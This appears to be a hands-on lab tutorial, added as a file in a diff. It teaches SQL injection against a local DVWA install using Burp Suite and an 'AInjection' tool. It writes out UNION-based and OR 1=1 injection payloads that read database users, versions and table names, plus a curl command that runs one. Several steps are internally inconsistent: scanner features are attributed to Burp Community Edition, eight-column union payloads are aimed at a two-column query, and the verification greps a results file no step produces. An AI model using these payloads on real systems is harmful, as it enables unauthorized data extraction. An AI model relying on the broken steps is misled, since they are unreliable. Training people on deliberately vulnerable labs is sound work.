@@ -1,0 +1,162 @@
+AI-Assisted SQL Injection via AInjection + Burp AI
+Learning Objectives
+By completing this lab, you will:
+
+Set up and configure Burp Suite Community Edition for web application testing
+Install and integrate AInjection for automated SQL injection detection
+Utilize Burp Suite's built-in AI capabilities for vulnerability exploitation
+Execute automated SQL injection attacks against vulnerable web applications
+Analyze and interpret AI-generated attack payloads and results
+Prerequisites
+Basic understanding of SQL injection vulnerabilities
+Familiarity with Linux command line operations
+Knowledge of web application security concepts
+Understanding of HTTP requests and responses
+Lab Environment
+Al Nafi provides a Linux-based cloud machine for this lab. Simply click Start Lab to access your dedicated environment. The machine comes as bare metal with no pre-installed tools, so you will install all required software during the lab exercises.
+
+Task 1: Set up Burp Suite for Web Application Testing
+Subtask 1.1: Install Java and Burp Suite Community Edition
+Update system packages and install Java:
+
+sudo apt update && sudo apt upgrade -y
+sudo apt install openjdk-11-jdk wget curl -y
+java -version
+Download and install Burp Suite Community Edition:
+
+cd /tmp
+wget "https://portswigger.net/burp/releases/download?product=community&version=2023.10.3.4&type=Linux" -O burpsuite_community.sh
+chmod +x burpsuite_community.sh
+sudo ./burpsuite_community.sh
+Subtask 1.2: Configure Burp Suite Proxy
+Launch Burp Suite:
+
+burpsuite &
+Configure proxy settings:
+
+Navigate to Proxy > Options
+Verify proxy listener is running on 127.0.0.1:8080
+Go to Proxy > Intercept and ensure intercept is off for now
+Subtask 1.3: Set up Vulnerable Web Application
+Install and configure DVWA (Damn Vulnerable Web Application):
+
+sudo apt install apache2 mysql-server php php-mysql php-gd libapache2-mod-php -y
+sudo systemctl start apache2
+sudo systemctl start mysql
+
+cd /var/www/html
+sudo git clone https://github.com/digininja/DVWA.git
+sudo chown -R www-data:www-data DVWA/
+sudo chmod -R 755 DVWA/
+
+sudo mysql -e "CREATE DATABASE dvwa; CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost'; FLUSH PRIVILEGES;"
+
+sudo cp DVWA/config/config.inc.php.dist DVWA/config/config.inc.php
+sudo sed -i "s/\$_DVWA\['db_password'\] = 'p@ssw0rd';/\$_DVWA\['db_password'\] = 'password';/" DVWA/config/config.inc.php
+Access DVWA setup:
+
+firefox http://localhost/DVWA/setup.php &
+Click Create / Reset Database and login with admin/password.
+
+Task 2: Integrate AInjection for Automated SQL Injection
+Subtask 2.1: Install AInjection Tool
+Install Python dependencies and AInjection:
+
+sudo apt install python3 python3-pip git -y
+pip3 install requests beautifulsoup4 urllib3
+
+cd /opt
+sudo git clone https://github.com/yhy0/AInjection.git
+cd AInjection
+sudo pip3 install -r requirements.txt
+Subtask 2.2: Configure AInjection with Burp Suite
+Create AInjection configuration file:
+
+cat > config.json << EOF
+{
+    "proxy": {
+        "http": "http://127.0.0.1:8080",
+        "https": "http://127.0.0.1:8080"
+    },
+    "target": "http://localhost/DVWA/vulnerabilities/sqli/",
+    "cookies": "security=low; PHPSESSID=your_session_id"
+}
+EOF
+Get DVWA session cookie:
+
+curl -c cookies.txt -d "username=admin&password=password&Login=Login" http://localhost/DVWA/login.php
+cat cookies.txt | grep PHPSESSID
+Update the PHPSESSID in config.json with the actual session ID.
+
+Subtask 2.3: Execute AInjection Scan
+Run AInjection against DVWA SQL injection page:
+
+python3 aiinjection.py -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" -c "security=low; PHPSESSID=your_actual_session_id" --proxy http://127.0.0.1:8080
+Monitor Burp Suite HTTP history to observe automated requests.
+
+Task 3: Use Burp AI for Automated Vulnerability Exploitation
+Subtask 3.1: Enable Burp Suite Extensions
+In Burp Suite:
+
+Go to Extender > BApp Store
+Install SQLiPy extension for enhanced SQL injection testing
+Install Logger++ for detailed request logging
+Subtask 3.2: Configure Automated Scanning
+Set up Burp Scanner:
+
+Navigate to Scanner > Live scanning
+Enable Live audit from Proxy
+Configure scan settings for SQL injection detection
+Subtask 3.3: Execute AI-Enhanced Vulnerability Testing
+Browse DVWA through Burp proxy:
+
+export http_proxy=http://127.0.0.1:8080
+export https_proxy=http://127.0.0.1:8080
+firefox http://localhost/DVWA/vulnerabilities/sqli/ &
+Perform manual testing while Burp AI analyzes:
+
+Enter 1' OR '1'='1 in the ID field
+Submit the form
+Observe Burp's automated analysis in Scanner > Results
+Subtask 3.4: Analyze AI-Generated Payloads
+Review Burp's findings:
+
+Check Scanner > Results for detected vulnerabilities
+Examine Issue details for AI-generated exploitation techniques
+Review Request/Response tabs for payload analysis
+Create custom payload list based on AI suggestions:
+
+cat > ai_payloads.txt << EOF
+1' UNION SELECT 1,2,3,4,5,6,7,8--
+1' UNION SELECT null,user(),version(),database(),null,null,null,null--
+1' UNION SELECT 1,table_name,null,null,null,null,null,null FROM information_schema.tables--
+1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+1' OR 1=1#
+EOF
+Subtask 3.5: Automated Exploitation with Intruder
+Configure Burp Intruder:
+
+Send SQL injection request to Intruder
+Set payload position on the id parameter
+Load ai_payloads.txt as payload list
+Execute attack and analyze results
+Verification and Results
+Verify successful exploitation:
+
+# Check if database information was extracted
+grep -i "database\|version\|user" /tmp/burp_results.txt
+
+# Verify successful union-based injection
+curl -s "http://localhost/DVWA/vulnerabilities/sqli/?id=1' UNION SELECT 1,user(),version(),database(),5,6,7,8--&Submit=Submit" \
+  -H "Cookie: security=low; PHPSESSID=your_session_id" | grep -i "mysql\|dvwa"
+Troubleshooting
+Common Issues:
+
+Burp Suite won't start: Ensure Java 11+ is installed
+DVWA database errors: Reset database permissions and recreate
+AInjection connection errors: Verify proxy settings and target URLs
+Session timeout: Refresh DVWA session and update cookies
+Conclusion
+You have successfully completed an advanced AI-assisted SQL injection lab using open-source tools. You learned to integrate AInjection with Burp Suite for automated vulnerability discovery, leveraged AI-enhanced scanning capabilities, and executed sophisticated SQL injection attacks. This combination of automated tools and AI assistance demonstrates modern approaches to web application security testing, providing efficient methods for identifying and exploiting SQL injection vulnerabilities in real-world scenarios.
+
+The skills acquired in this lab are directly applicable to penetration testing, security assessments, and vulnerability research in professional cybersecurity environments.
